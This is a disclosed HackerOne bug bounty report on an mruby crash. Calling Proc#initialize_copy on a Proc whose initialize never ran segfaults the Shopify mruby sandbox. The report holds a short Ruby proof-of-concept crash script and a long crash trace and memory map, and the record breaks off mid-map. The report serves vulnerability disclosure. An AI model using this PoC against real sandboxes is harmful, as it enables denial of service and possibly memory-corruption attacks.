{"id":184857,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQ4NTc=","url":"https://hackerone.com/reports/184857","title":"Crash: calling Proc::initialize_copy with a Proc instance where initialize never ran leads to a crash","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2016-11-24T13:56:51.618Z","submitted_at":"2016-11-24T13:56:51.618Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"brakhane","url":"/brakhane","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-16T22:18:58.683Z","bug_reporter_agreed_on_going_public_at":"2016-12-16T22:18:58.613Z","team_member_agreed_on_going_public_at":"2016-12-16T20:27:15.661Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Using the same trick from #184661 with `Proc` leads to another crash, this time in `Proc` related functions.\n\nAgain, haven't looked into it besides validity testing and an initial code lookup (more detailed investigation + possible patches when there's more time on my side). Again, to give you guys the possibility to get this fixed ASAP without being limited by the time I got to spare.\n\n# Impact\nI didn't look too close but as it's accessing a 0+OFFSET this might be usable to gain code execution. Otherwise it's just a DoS, further investigation is needed.\n\n# PoC\nThe PoC below crashes the `https://www.mruby.science/runs` sandbox, `mruby` master tip and `mruby-engine` reliably.\n\n```\na = Proc.new do\nend\n\nclass Proc\n  def initialize\n  end\nend\n\nb = Proc.new\na.initialize_copy b\n```\n\n# Traces\n\nmruby-sandbox output:\n```\n$ bin/sandbox crashes/proc_crash.mrb\nbin/sandbox:20: [BUG] Segmentation fault at 0x00000000000068\nruby 2.3.3p222 (2016-11-21 revision 56859) [x86_64-linux]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0201 s:0005 E:002398 EVAL   bin/sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001090 (none) [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\nbin/sandbox:20:in `\u003cmain\u003e'\nbin/sandbox:20:in `sandbox_eval'\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007fdcc38ec605 RBP: 0x00007fdcc24524e0 RSP: 0x00007fdcc2450aa8\n RAX: 0x0000000000000000 RBX: 0x00007fdcc245a520 RCX: 0x0000000000000000\n RDX: 0x0000000000000000 RDI: 0x00007fdcc245a520 RSI: 0x00007fdcc245a490\n  R8: 0x00007fdcc2460560  R9: 0x0000000000000001 R10: 0x0000000000000000\n R11: 0x0000000000000000 R12: 0x00007fdcc245a520 R13: 0x000000000000004d\n R14: 0x00007fdcc24524e0 R15: 0x00007fdcc245cb60 EFL: 0x0000000000010246\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/libruby.so.2.3 [0x7fdcc79aa455]\n/usr/lib/libruby.so.2.3 [0x7fdcc79aa68c]\n/usr/lib/libruby.so.2.3 [0x7fdcc7884e34]\n/usr/lib/libruby.so.2.3 [0x7fdcc79366ce]\n/usr/lib/libc.so.6 [0x7fdcc74aa0b0]\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_copy+0x25) [0x7fdcc38ec605] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:143\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_proc_init_copy+0x7e) [0x7fdcc38ec7be] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x75f) [0x7fdcc38dae4f] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7fdcc38e0697] /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7fdcc38c1613] ../../../../ext/mruby_engine/eval_monitored.c:68\n/usr/lib/libpthread.so.0(start_thread+0xc4) [0x7fdcc7261454]\n/usr/lib/libc.so.6(clone+0x5f) [0x7fdcc755f7df]\n\n-- Other runtime information -----------------------------------------------\n\n* Loaded script: bin/sandbox\n\n* Loaded features:\n\n    0 enumerator.so\n    1 thread.rb\n    2 rational.so\n    3 complex.so\n    4 /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n    5 /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n    6 /usr/lib/ruby/2.3.0/unicode_normalize.rb\n    7 /usr/lib/ruby/2.3.0/x86_64-linux/rbconfig.rb\n    8 /usr/lib/ruby/2.3.0/rubygems/compatibility.rb\n    9 /usr/lib/ruby/2.3.0/rubygems/defaults.rb\n   10 /usr/lib/ruby/2.3.0/rubygems/deprecate.rb\n   11 /usr/lib/ruby/2.3.0/rubygems/errors.rb\n   12 /usr/lib/ruby/2.3.0/rubygems/version.rb\n   13 /usr/lib/ruby/2.3.0/rubygems/requirement.rb\n   14 /usr/lib/ruby/2.3.0/rubygems/platform.rb\n   15 /usr/lib/ruby/2.3.0/rubygems/basic_specification.rb\n   16 /usr/lib/ruby/2.3.0/rubygems/stub_specification.rb\n   17 /usr/lib/ruby/2.3.0/rubygems/util/list.rb\n   18 /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n   19 /usr/lib/ruby/2.3.0/rubygems/specification.rb\n   20 /usr/lib/ruby/2.3.0/rubygems/exceptions.rb\n   21 /usr/lib/ruby/2.3.0/rubygems/dependency.rb\n   22 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_gem.rb\n   23 /usr/lib/ruby/2.3.0/monitor.rb\n   24 /usr/lib/ruby/2.3.0/rubygems/core_ext/kernel_require.rb\n   25 /usr/lib/ruby/2.3.0/rubygems.rb\n   26 /usr/lib/ruby/2.3.0/rubygems/path_support.rb\n   27 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/version.rb\n   28 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/core_ext/name_error.rb\n   29 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/levenshtein.rb\n   30 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/jaro_winkler.rb\n   31 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkable.rb\n   32 /usr/lib/ruby/2.3.0/delegate.rb\n   33 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/class_name_checker.rb\n   34 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers/variable_name_checker.rb\n   35 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/name_error_checkers.rb\n   36 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/method_name_checker.rb\n   37 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/spell_checkers/null_checker.rb\n   38 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean/formatter.rb\n   39 /usr/lib/ruby/gems/2.3.0/gems/did_you_mean-1.0.0/lib/did_you_mean.rb\n   40 /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n   41 /usr/lib/ruby/2.3.0/pathname.rb\n   42 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/postit_trampoline.rb\n   43 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/constants.rb\n   44 /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n   45 /usr/lib/ruby/2.3.0/rubygems/user_interaction.rb\n   46 /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n   47 /usr/lib/ruby/2.3.0/rubygems/config_file.rb\n   48 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_integration.rb\n   49 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/current_ruby.rb\n   50 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/shared_helpers.rb\n   51 /usr/lib/ruby/2.3.0/fileutils.rb\n   52 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/errors.rb\n   53 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/environment_preserver.rb\n   54 /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n   55 /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n   56 /usr/lib/ruby/2.3.0/socket.rb\n   57 /usr/lib/ruby/2.3.0/timeout.rb\n   58 /usr/lib/ruby/2.3.0/net/protocol.rb\n   59 /usr/lib/ruby/2.3.0/uri/rfc2396_parser.rb\n   60 /usr/lib/ruby/2.3.0/uri/rfc3986_parser.rb\n   61 /usr/lib/ruby/2.3.0/uri/common.rb\n   62 /usr/lib/ruby/2.3.0/uri/generic.rb\n   63 /usr/lib/ruby/2.3.0/uri/ftp.rb\n   64 /usr/lib/ruby/2.3.0/uri/http.rb\n   65 /usr/lib/ruby/2.3.0/uri/https.rb\n   66 /usr/lib/ruby/2.3.0/uri/ldap.rb\n   67 /usr/lib/ruby/2.3.0/uri/ldaps.rb\n   68 /usr/lib/ruby/2.3.0/uri/mailto.rb\n   69 /usr/lib/ruby/2.3.0/uri.rb\n   70 /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n   71 /usr/lib/ruby/2.3.0/net/http/exceptions.rb\n   72 /usr/lib/ruby/2.3.0/net/http/header.rb\n   73 /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n   74 /usr/lib/ruby/2.3.0/net/http/generic_request.rb\n   75 /usr/lib/ruby/2.3.0/net/http/request.rb\n   76 /usr/lib/ruby/2.3.0/net/http/requests.rb\n   77 /usr/lib/ruby/2.3.0/net/http/response.rb\n   78 /usr/lib/ruby/2.3.0/net/http/responses.rb\n   79 /usr/lib/ruby/2.3.0/net/http/proxy_delta.rb\n   80 /usr/lib/ruby/2.3.0/net/http/backward.rb\n   81 /usr/lib/ruby/2.3.0/net/http.rb\n   82 /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n   83 /usr/lib/ruby/2.3.0/date.rb\n   84 /usr/lib/ruby/2.3.0/time.rb\n   85 /usr/lib/ruby/2.3.0/rubygems/request/http_pool.rb\n   86 /usr/lib/ruby/2.3.0/rubygems/request/https_pool.rb\n   87 /usr/lib/ruby/2.3.0/rubygems/request/connection_pools.rb\n   88 /usr/lib/ruby/2.3.0/rubygems/request.rb\n   89 /usr/lib/ruby/2.3.0/cgi/core.rb\n   90 /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n   91 /usr/lib/ruby/2.3.0/cgi/util.rb\n   92 /usr/lib/ruby/2.3.0/cgi/cookie.rb\n   93 /usr/lib/ruby/2.3.0/cgi.rb\n   94 /usr/lib/ruby/2.3.0/rubygems/uri_formatter.rb\n   95 /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n   96 /usr/lib/ruby/2.3.0/digest.rb\n   97 /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n   98 /usr/lib/ruby/2.3.0/openssl/bn.rb\n   99 /usr/lib/ruby/2.3.0/openssl/pkey.rb\n  100 /usr/lib/ruby/2.3.0/openssl/cipher.rb\n  101 /usr/lib/ruby/2.3.0/openssl/config.rb\n  102 /usr/lib/ruby/2.3.0/openssl/digest.rb\n  103 /usr/lib/ruby/2.3.0/openssl/x509.rb\n  104 /usr/lib/ruby/2.3.0/openssl/buffering.rb\n  105 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n  106 /usr/lib/ruby/2.3.0/openssl/ssl.rb\n  107 /usr/lib/ruby/2.3.0/openssl.rb\n  108 /usr/lib/ruby/2.3.0/securerandom.rb\n  109 /usr/lib/ruby/2.3.0/resolv.rb\n  110 /usr/lib/ruby/2.3.0/rubygems/remote_fetcher.rb\n  111 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_remote_fetcher.rb\n  112 /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n  113 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api/source.rb\n  114 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin/api.rb\n  115 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/plugin.rb\n  116 /usr/lib/ruby/2.3.0/rubygems/util.rb\n  117 /usr/lib/ruby/2.3.0/rubygems/source/git.rb\n  118 /usr/lib/ruby/2.3.0/rubygems/source/installed.rb\n  119 /usr/lib/ruby/2.3.0/rubygems/source/specific_file.rb\n  120 /usr/lib/ruby/2.3.0/rubygems/source/local.rb\n  121 /usr/lib/ruby/2.3.0/rubygems/source/lock.rb\n  122 /usr/lib/ruby/2.3.0/rubygems/source/vendor.rb\n  123 /usr/lib/ruby/2.3.0/rubygems/source.rb\n  124 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_helpers.rb\n  125 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/match_platform.rb\n  126 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/rubygems_ext.rb\n  127 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/version.rb\n  128 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler.rb\n  129 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/settings.rb\n  130 /usr/lib/ruby/2.3.0/rubygems/ext/build_error.rb\n  131 /usr/lib/ruby/2.3.0/rubygems/ext/builder.rb\n  132 /usr/lib/ruby/2.3.0/rubygems/ext/configure_builder.rb\n  133 /usr/lib/ruby/2.3.0/tmpdir.rb\n  134 /usr/lib/ruby/2.3.0/tempfile.rb\n  135 /usr/lib/ruby/2.3.0/rubygems/ext/ext_conf_builder.rb\n  136 /usr/lib/ruby/2.3.0/rubygems/ext/rake_builder.rb\n  137 /usr/lib/ruby/2.3.0/optparse.rb\n  138 /usr/lib/ruby/2.3.0/rubygems/command.rb\n  139 /usr/lib/ruby/2.3.0/rubygems/ext/cmake_builder.rb\n  140 /usr/lib/ruby/2.3.0/rubygems/ext.rb\n  141 /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n  142 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source.rb\n  143 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/path.rb\n  144 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/git.rb\n  145 /usr/lib/ruby/2.3.0/rubygems/text.rb\n  146 /usr/lib/ruby/2.3.0/rubygems/name_tuple.rb\n  147 /usr/lib/ruby/2.3.0/rubygems/spec_fetcher.rb\n  148 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/rubygems.rb\n  149 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lockfile_parser.rb\n  150 /usr/lib/ruby/2.3.0/set.rb\n  151 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/definition.rb\n  152 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dependency.rb\n  153 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ruby_dsl.rb\n  154 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dsl.rb\n  155 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source_list.rb\n  156 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/version.rb\n  157 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/index.rb\n  158 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/source/gemspec.rb\n  159 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/lazy_specification.rb\n  160 /usr/lib/ruby/2.3.0/tsort.rb\n  161 /usr/lib/ruby/2.3.0/forwardable.rb\n  162 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/spec_set.rb\n  163 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/gem_version_promoter.rb\n  164 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/runtime.rb\n  165 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui.rb\n  166 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/silent.rb\n  167 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/ui/rg_proxy.rb\n  168 /usr/lib/ruby/2.3.0/rubygems/util/licenses.rb\n  169 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/remote_specification.rb\n  170 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/dep_proxy.rb\n  171 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/gem_metadata.rb\n  172 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/errors.rb\n  173 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/action.rb\n  174 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_edge_no_circular.rb\n  175 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/add_vertex.rb\n  176 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/detach_vertex_named.rb\n  177 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/set_payload.rb\n  178 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/tag.rb\n  179 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/log.rb\n  180 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph/vertex.rb\n  181 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/dependency_graph.rb\n  182 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/state.rb\n  183 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/specification_provider.rb\n  184 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/resolution_state.rb\n  185 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/delegates/specification_provider.rb\n  186 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolution.rb\n  187 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/resolver.rb\n  188 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo/modules/ui.rb\n  189 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendor/molinillo/lib/molinillo.rb\n  190 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/vendored_molinillo.rb\n  191 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/resolver.rb\n  192 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/endpoint_specification.rb\n  193 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/stub_specification.rb\n  194 /home/simon/.gem/ruby/2.3.0/gems/bundler-1.13.6/lib/bundler/setup.rb\n  195 /usr/lib/ruby/2.3.0/json/version.rb\n  196 /usr/lib/ruby/2.3.0/ostruct.rb\n  197 /usr/lib/ruby/2.3.0/json/generic_object.rb\n  198 /usr/lib/ruby/2.3.0/json/common.rb\n  199 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n  200 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n  201 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n  202 /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n  203 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n  204 /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n  205 /usr/lib/ruby/2.3.0/json/ext.rb\n  206 /usr/lib/ruby/2.3.0/json.rb\n  207 /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n  208 /home/simon/git/shopify/mruby-engine/lib/mruby_engine.rb\n\n* Process memory map:\n\n00400000-00401000 r-xp 00000000 08:03 948907                             /usr/bin/ruby\n00600000-00601000 r--p 00000000 08:03 948907                             /usr/bin/ruby\n00601000-00602000 rw-p 00001000 08:03 948907                             /usr/bin/ruby\n01d8c000-02ea2000 rw-p 00000000 00:00 0                                  [heap]\n7fdcbc000000-7fdcbc021000 rw-p 00000000 00:00 0 \n7fdcbc021000-7fdcc0000000 ---p 00000000 00:00 0 \n7fdcc11b5000-7fdcc15e1000 r--s 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7fdcc15e1000-7fdcc17be000 r--s 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n7fdcc17be000-7fdcc1a3a000 r--s 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n7fdcc1a3a000-7fdcc1a50000 r-xp 00000000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7fdcc1a50000-7fdcc1c4f000 ---p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7fdcc1c4f000-7fdcc1c50000 r--p 00015000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7fdcc1c50000-7fdcc1c51000 rw-p 00016000 08:03 935430                     /usr/lib/libgcc_s.so.1\n7fdcc1c51000-7fdcc1c52000 ---p 00000000 00:00 0 \n7fdcc1c52000-7fdcc2852000 rw-p 00000000 00:00 0 \n7fdcc2852000-7fdcc2859000 r-xp 00000000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7fdcc2859000-7fdcc2a59000 ---p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7fdcc2a59000-7fdcc2a5a000 r--p 00007000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7fdcc2a5a000-7fdcc2a5b000 rw-p 00008000 08:03 1061028                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/generator.so\n7fdcc2a5b000-7fdcc2a5c000 r-xp 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7fdcc2a5c000-7fdcc2c5b000 ---p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7fdcc2c5b000-7fdcc2c5c000 r--p 00000000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7fdcc2c5c000-7fdcc2c5d000 rw-p 00001000 08:03 948492                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32le.so\n7fdcc2c5d000-7fdcc2c5e000 r-xp 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7fdcc2c5e000-7fdcc2e5d000 ---p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7fdcc2e5d000-7fdcc2e5e000 r--p 00000000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7fdcc2e5e000-7fdcc2e5f000 rw-p 00001000 08:03 948496                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_32be.so\n7fdcc2e5f000-7fdcc2e60000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7fdcc2e60000-7fdcc3060000 ---p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7fdcc3060000-7fdcc3061000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7fdcc3061000-7fdcc3062000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16le.so\n7fdcc3062000-7fdcc3063000 r-xp 00000000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7fdcc3063000-7fdcc3263000 ---p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7fdcc3263000-7fdcc3264000 r--p 00001000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7fdcc3264000-7fdcc3265000 rw-p 00002000 08:03 948515                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/utf_16be.so\n7fdcc3265000-7fdcc326b000 r-xp 00000000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7fdcc326b000-7fdcc346a000 ---p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7fdcc346a000-7fdcc346b000 r--p 00005000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7fdcc346b000-7fdcc346c000 rw-p 00006000 08:03 1061029                    /usr/lib/ruby/2.3.0/x86_64-linux/json/ext/parser.so\n7fdcc346c000-7fdcc3491000 r-xp 00000000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n7fdcc3491000-7fdcc3690000 ---p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n7fdcc3690000-7fdcc3691000 r--p 00024000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n7fdcc3691000-7fdcc3692000 rw-p 00025000 08:03 920898                     /usr/lib/liblzma.so.5.2.2\n7fdcc3692000-7fdcc369d000 r-xp 00000000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7fdcc369d000-7fdcc389c000 ---p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7fdcc389c000-7fdcc389d000 r--p 0000a000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7fdcc389d000-7fdcc389e000 rw-p 0000b000 08:03 944077                     /usr/lib/libunwind.so.8.0.1\n7fdcc389e000-7fdcc38ac000 rw-p 00000000 00:00 0 \n7fdcc38ac000-7fdcc398a000 r-xp 00000000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7fdcc398a000-7fdcc3b89000 ---p 000de000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7fdcc3b89000-7fdcc3b8b000 r--p 000dd000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7fdcc3b8b000-7fdcc3b8d000 rw-p 000df000 08:04 1838958                    /home/simon/git/shopify/mruby-engine/lib/mruby_engine/mruby_engine.so\n7fdcc3b8d000-7fdcc3b92000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7fdcc3b92000-7fdcc3d91000 ---p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/strscan.so\n7fdcc3d91000-7fdcc3d92000 